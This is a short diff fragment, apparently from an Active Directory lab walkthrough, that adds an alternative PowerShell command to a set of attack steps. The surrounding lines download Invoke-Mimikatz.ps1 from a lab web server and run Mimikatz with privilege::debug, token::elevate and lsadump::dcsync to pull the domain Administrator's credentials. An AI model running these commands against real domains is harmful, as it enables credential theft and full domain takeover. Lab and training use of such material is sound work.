@@ -63,6 +63,11 @@ Invoke-WebRequest -Uri "http://10.0.5.101:8080/Invoke-Mimikatz.ps1" -Outfile mim
 "token::elevate" "lsadump::dcsync /domain:research.security.local /user:"CN=Administrator,CN=Users,DC=research,DC=security,DC=l
 ocal""'
 
+ OR
+
+[seclogs.research.SECURITY.local]: PS C:\Users\student.RESEARCH\Documents> Invoke-Mimikatz -Command '"privilege::debug"
+"token::elevate" "lsadump::dcsync /domain:research.security.local /user:administrator@research.security.local"'
+
 ```
 
 On CLIENT
